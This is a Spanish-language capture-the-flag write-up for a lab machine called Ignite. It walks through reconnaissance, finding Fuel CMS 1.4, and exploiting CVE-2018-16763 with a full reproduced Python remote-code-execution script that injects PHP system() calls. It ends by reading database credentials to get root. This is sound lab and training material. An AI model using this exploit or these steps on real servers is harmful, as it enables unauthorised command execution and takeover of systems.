<h1 align="center">IGNITE</h1>

<p align="center"><img src="https://github.com/user-attachments/assets/fa03ed2c-01b4-4e32-9b09-0d65b14c13de"></p>

# INTRODUCCIÓN

Nos enfrentamos a la máquina Ignite, no tenemos mucha información.

Para empezar hacemos un test de conectividad.

![image](https://github.com/user-attachments/assets/6372bc97-569c-41b3-b38b-50086290acd8)

Nos encontramos con una máquina linux "ttl=64"

Procedemos a hacer un escaner de puertos

![image](https://github.com/user-attachments/assets/814d8e8d-0e67-4607-9f5d-b11939a48a56)

Nos encontramos una web funcionando por el puerto 80 (podríamos escanear todos los puertos en caso de querer buscar más)

Nos ecnontramos que tenemos el famoso "robots.txt" una rchivo /fuel/

Un apache 2.4.18 y tiene pinta que funciona con el CMS FUEL

Yo empezare haciendo un "curl -v" para ver si puedo sacar más información antes de entrar por navegador.

![image](https://github.com/user-attachments/assets/5c65bd8c-b116-451a-9e56-98f295265500)

No nos da mucha información vamos a probar con el navegador.

![image](https://github.com/user-attachments/assets/ef535631-8ca5-4d0f-89a0-7a4b536dce57)

Vemos que es inicio de el CMS FUEL con la versión 1.4 (miremos si tiene una vulnerabilidad)

![image](https://github.com/user-attachments/assets/bbf017ca-1643-414e-8700-4c6f1be52e4c)

```
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()
	
	return args


args = get_arguments()
url = args.url 

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
		
	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":
		break
```

Parece que hemos dado en la diana.

![image](https://github.com/user-attachments/assets/bfa62295-dd5a-4c84-adb4-5b4ecb763544)

Estamos dentro, ahora lo que me centraría yo es en crear una buena shell y upgradearla.

```
/bin/bash -i
```

![image](https://github.com/user-attachments/assets/31b562b7-efc7-4532-8a8f-d744a28d7650)

![image](https://github.com/user-attachments/assets/00ad2cf4-a851-4036-ace9-13dd33af2a4b)

Sacamos la flag de usuario

![image](https://github.com/user-attachments/assets/2e4ab794-9182-44c7-9a1b-2bd63f3e26f1)

Ahora probaremos a hacer una escalada de privilegios, lo primero que probaria es hacer un sudo -l

```
sudo -l
```

Obviamente no vamos a poder hacerlo porque necesitamos una contraseña.

Después de mucho rato buscando e investigando, me he dispuesto a investigar el sistema. Scripts, etc, kernel.

La cosa era mucho más simple que todo esto

```
find / -name database.php 2>&1 | grep -v “Permission denied”
```

![image](https://github.com/user-attachments/assets/a83bd7be-2c21-42c0-9da7-fe7818388b1f)

```
su root
```

![image](https://github.com/user-attachments/assets/7a2c0fbc-5ec7-4a69-919a-6af3a85e2ee1)

GG











